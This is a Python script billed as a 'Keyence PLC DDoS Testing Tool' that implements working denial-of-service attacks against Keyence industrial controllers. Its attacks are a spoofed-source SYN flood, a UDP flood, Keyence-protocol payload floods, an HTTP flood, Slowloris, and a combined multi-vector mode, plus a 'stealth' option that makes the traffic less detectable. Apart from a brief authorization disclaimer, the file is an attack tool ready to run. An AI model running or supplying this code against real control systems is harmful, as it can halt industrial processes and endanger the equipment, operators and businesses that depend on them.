#!/usr/bin/env python3
"""
Enhanced Keyence PLC DDoS Testing Tool - Windows Compatible
Authorized penetration testing only - Use responsibly
"""

import socket
import threading
import time
import random
import argparse
import sys
import struct
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from scapy.all import IP, TCP, UDP, send, RandIP, RandShort, conf, get_if_list
    from scapy.arch.windows import get_windows_if_list
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not available. Some attacks will be disabled.")

class WindowsKeyenceDDOSTester:
    def __init__(self, target_ip, target_port=8080, timeout=2, stealth=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.stealth = stealth
        self.attack_active = False
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'failed_connections': 0,
            'start_time': time.time()
        }
        
        # Get correct network interface for Windows
        self.interface = self.get_windows_interface()
        
        # Keyence-specific payload patterns
        self.keyence_payloads = [
            b'\x50\x00\x00\xFF\xFF\x03\x00\x0C\x00\x01\x00\x01\x00\x00\x00\x00',
            b'\x50\x01\x00\xFF\xFF\x03\x00\x0C\x00\x01\x00\x01\x00\x00\x00\x00',
            b'\x00' * 1024,
            b'\xFF' * 1024,
            b'\xAA' * 512,
            random.randbytes(1024),
        ]
        
    def get_windows_interface(self):
        """Get the correct network interface for Windows"""
        try:
            if SCAPY_AVAILABLE:
                # Try to find a non-loopback interface
                interfaces = get_if_list()
                for iface in interfaces:
                    if 'loopback' not in iface.lower() and 'km-test' not in iface.lower():
                        return iface
                
                # If no good interface found, use default
                return None
        except:
            pass
        return None
    
    def print_banner(self):
        banner = r"""
  _  __          _                         ______  ______  _____ 
 | |/ /         | |                       |  ____||  ____||  __ \
 | ' / ___ _   _| | ___   __ _  ___ ______| |__   | |__   | |  | |
 |  < / _ \ | | | |/ _ \ / _` |/ _ \______|  __|  |  __|  | |  | |
 | . \  __/ |_| | | (_) | (_| |  __/      | |____ | |____ | |__| |
 |_|\_\___|\__, |_|\___/ \__, |\___|      |______||______||_____/
            __/ |         __/ |                                  
           |___/         |___/                                   
        """
        print(banner)
        print("Windows-Compatible Keyence PLC DDoS Testing Tool")
        print("=" * 50)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Interface: {self.interface or 'Default'}")
        print("=" * 50)
        
    def tcp_syn_flood(self, duration=60, max_threads=100):
        """Windows-compatible TCP SYN Flood attack"""
        if not SCAPY_AVAILABLE:
            print("[-] Scapy not available. SYN flood disabled.")
            return {'attack_type': 'TCP SYN Flood', 'packets_sent': 0}
            
        print(f"[*] Starting TCP SYN Flood for {duration} seconds")
        
        stop_time = time.time() + duration
        packets_sent = 0
        
        def syn_flood_worker():
            nonlocal packets_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Generate random source IP and port
                    src_ip = RandIP()._fix() if not self.stealth else "192.168." + ".".join(map(str, (random.randint(0, 255) for _ in range(2))))
                    src_port = RandShort()._fix()
                    
                    # Craft SYN packet
                    ip_layer = IP(src=src_ip, dst=self.target_ip)
                    tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(0, 4294967295))
                    
                    # Send packet with specific interface
                    send(ip_layer/tcp_layer, verbose=0, iface=self.interface)
                    packets_sent += 1
                    
                    if packets_sent % 500 == 0:
                        print(f"[+] Sent {packets_sent} SYN packets")
                        
                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in SYN flood: {e}")
                    time.sleep(0.1)
        
        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(syn_flood_worker) for _ in range(max_threads)]
            
            for future in as_completed(futures):
                if time.time() > stop_time:
                    break
        
        return {'attack_type': 'TCP SYN Flood', 'packets_sent': packets_sent}
    
    def udp_flood(self, duration=60, max_threads=50):
        """UDP Flood attack - No Scapy required"""
        print(f"[*] Starting UDP Flood for {duration} seconds")
        
        stop_time = time.time() + duration
        packets_sent = 0
        
        def udp_flood_worker():
            nonlocal packets_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Create raw socket for UDP flood
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.1)
                    
                    # Generate random payload
                    payload_size = random.randint(100, 1024)
                    payload = random.randbytes(payload_size)
                    
                    # Send to target port
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    packets_sent += 1
                    
                    if packets_sent % 1000 == 0:
                        print(f"[+] Sent {packets_sent} UDP packets")
                        
                    sock.close()
                    
                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in UDP flood: {e}")
                    time.sleep(0.1)
        
        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(udp_flood_worker) for _ in range(max_threads)]
            
            for future in as_completed(futures):
                if time.time() > stop_time:
                    break
        
        return {'attack_type': 'UDP Flood', 'packets_sent': packets_sent}
    
    def keyence_protocol_flood(self, duration=60, max_threads=30):
        """Keyence protocol-specific flood attack"""
        print(f"[*] Starting Keyence Protocol Flood for {duration} seconds")
        
        stop_time = time.time() + duration
        packets_sent = 0
        
        def protocol_flood_worker():
            nonlocal packets_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Create TCP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    
                    # Connect to target
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Send multiple Keyence protocol packets
                    for _ in range(random.randint(3, 10)):
                        payload = random.choice(self.keyence_payloads)
                        sock.send(payload)
                        packets_sent += 1
                    
                    sock.close()
                    
                    if packets_sent % 100 == 0:
                        print(f"[+] Sent {packets_sent} Keyence protocol packets")
                        
                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in protocol flood: {e}")
                    time.sleep(0.5)
        
        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(protocol_flood_worker) for _ in range(max_threads)]
            
            for future in as_completed(futures):
                if time.time() > stop_time:
                    break
        
        return {'attack_type': 'Keyence Protocol Flood', 'packets_sent': packets_sent}
    
    def http_flood(self, duration=60, max_threads=20):
        """HTTP Flood attack for Keyence web interfaces"""
        print(f"[*] Starting HTTP Flood for {duration} seconds")
        
        stop_time = time.time() + duration
        requests_sent = 0
        
        # Common HTTP requests for Keyence devices
        http_requests = [
            "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
            "GET /index.html HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
            "GET /main.html HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
            "POST /login.cgi HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n",
        ]
        
        def http_flood_worker():
            nonlocal requests_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Create TCP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    
                    # Connect to HTTP port (typically 80 or 8080)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Send HTTP request
                    request = random.choice(http_requests).format(self.target_ip)
                    sock.send(request.encode())
                    requests_sent += 1
                    
                    # Try to read response to keep connection open
                    try:
                        sock.recv(1024)
                    except:
                        pass
                    
                    sock.close()
                    
                    if requests_sent % 50 == 0:
                        print(f"[+] Sent {requests_sent} HTTP requests")
                        
                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in HTTP flood: {e}")
                    time.sleep(0.5)
        
        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(http_flood_worker) for _ in range(max_threads)]
            
            for future in as_completed(futures):
                if time.time() > stop_time:
                    break
        
        return {'attack_type': 'HTTP Flood', 'requests_sent': requests_sent}
    
    def slowloris_attack(self, duration=120, sockets_count=50):
        """Slowloris attack to exhaust connection resources"""
        print(f"[*] Starting Slowloris attack with {sockets_count} sockets")
        
        sockets = []
        stop_time = time.time() + duration
        
        # Create multiple partial connections
        for i in range(sockets_count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request
                partial_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode()
                sock.send(partial_request)
                
                sockets.append(sock)
                
                if len(sockets) % 10 == 0:
                    print(f"[+] Established {len(sockets)} partial connections")
                    
            except Exception as e:
                if not self.stealth:
                    print(f"[-] Error creating socket: {e}")
        
        print(f"[*] Maintaining {len(sockets)} connections")
        
        # Keep connections alive with periodic data
        start_time = time.time()
        while self.attack_active and time.time() < stop_time and sockets:
            for sock in sockets[:]:
                try:
                    # Send minimal data to keep connection open
                    keep_alive = f"X-a: {random.randint(1000, 9999)}\r\n".encode()
                    sock.send(keep_alive)
                    
                    # Random delay between 5-15 seconds
                    time.sleep(random.uniform(5, 15))
                    
                except Exception as e:
                    sockets.remove(sock)
                    if not self.stealth:
                        print(f"[*] Connection dropped, {len(sockets)} remaining")
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        return {
            'attack_type': 'Slowloris',
            'sockets_created': sockets_count,
            'sockets_maintained': len(sockets),
            'duration': time.time() - start_time
        }
    
    def multi_vector_attack(self, duration=300):
        """Launch multiple attack vectors simultaneously"""
        print(f"[*] Starting Multi-Vector Attack for {duration} seconds")
        print("[!] This is a highly aggressive attack - use with caution!")
        
        # Only use attacks that work without Scapy if it's not available
        if SCAPY_AVAILABLE:
            attack_methods = [
                (self.tcp_syn_flood, {"duration": duration, "max_threads": 50}),
                (self.udp_flood, {"duration": duration, "max_threads": 30}),
                (self.keyence_protocol_flood, {"duration": duration, "max_threads": 20}),
                (self.http_flood, {"duration": duration, "max_threads": 15}),
                (self.slowloris_attack, {"duration": duration, "sockets_count": 30}),
            ]
        else:
            attack_methods = [
                (self.udp_flood, {"duration": duration, "max_threads": 40}),
                (self.keyence_protocol_flood, {"duration": duration, "max_threads": 25}),
                (self.http_flood, {"duration": duration, "max_threads": 20}),
                (self.slowloris_attack, {"duration": duration, "sockets_count": 40}),
            ]
        
        results = []
        
        # Start all attacks simultaneously
        with ThreadPoolExecutor(max_workers=len(attack_methods)) as executor:
            futures = []
            for method, kwargs in attack_methods:
                futures.append(executor.submit(method, **kwargs))
            
            # Wait for all attacks to complete
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                    print(f"[+] {result['attack_type']} completed")
                except Exception as e:
                    print(f"[-] Attack failed: {e}")
        
        return results
    
    def print_stats(self):
        """Print attack statistics"""
        duration = time.time() - self.stats['start_time']
        print("\n" + "="*60)
        print("ATTACK STATISTICS")
        print("="*60)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Scapy Available: {SCAPY_AVAILABLE}")
        print("="*60)
    
    def run_attack(self, attack_type, duration=60, **kwargs):
        """Run a specific attack type"""
        self.attack_active = True
        self.stats['start_time'] = time.time()
        
        try:
            if attack_type == "syn" and SCAPY_AVAILABLE:
                result = self.tcp_syn_flood(duration, **kwargs)
            elif attack_type == "udp":
                result = self.udp_flood(duration, **kwargs)
            elif attack_type == "keyence":
                result = self.keyence_protocol_flood(duration, **kwargs)
            elif attack_type == "http":
                result = self.http_flood(duration, **kwargs)
            elif attack_type == "slowloris":
                result = self.slowloris_attack(duration, **kwargs)
            elif attack_type == "multi":
                result = self.multi_vector_attack(duration)
            else:
                if attack_type == "syn" and not SCAPY_AVAILABLE:
                    print("[-] SYN flood requires Scapy. Use other attack types.")
                else:
                    print("[-] Unknown attack type")
                return
            
            self.print_stats()
            return result
            
        except KeyboardInterrupt:
            print("\n[-] Attack interrupted by user")
        except Exception as e:
            print(f"[-] Error during attack: {e}")
        finally:
            self.attack_active = False

def main():
    parser = argparse.ArgumentParser(description="Windows-Compatible Keyence PLC DDoS Testing Tool")
    parser.add_argument("target", help="Target IP address of Keyence PLC")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Target port (default: 8080)")
    parser.add_argument("-a", "--attack", choices=["syn", "udp", "keyence", "http", "slowloris", "multi"], 
                       default="multi", help="Attack type (default: multi)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Max threads for attacks (default: 50)")
    parser.add_argument("-s", "--stealth", action="store_true", help="Enable stealth mode (slower, less detectable)")
    parser.add_argument("--sockets", type=int, default=30, help="Number of sockets for Slowloris (default: 30)")
    
    args = parser.parse_args()
    
    # Safety checks
    if not args.target:
        print("[-] Target IP is required")
        sys.exit(1)
    
    # Initialize tester
    tester = WindowsKeyenceDDOSTester(args.target, args.port, stealth=args.stealth)
    tester.print_banner()
    
    print("[!] WARNING: This tool is for authorized penetration testing only!")
    print("[!] Ensure you have proper authorization before proceeding!")
    print("[!] Press Ctrl+C to abort within 5 seconds...")
    
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        print("\n[-] Test aborted by user")
        sys.exit(0)
    
    # Run the attack
    kwargs = {
        "max_threads": args.threads,
        "sockets_count": args.sockets
    }
    
    try:
        tester.run_attack(args.attack, args.duration, **kwargs)
    except KeyboardInterrupt:
        print("\n[-] Testing interrupted by user")
    except Exception as e:
        print(f"[-] Error during testing: {e}")

if __name__ == "__main__":
    main()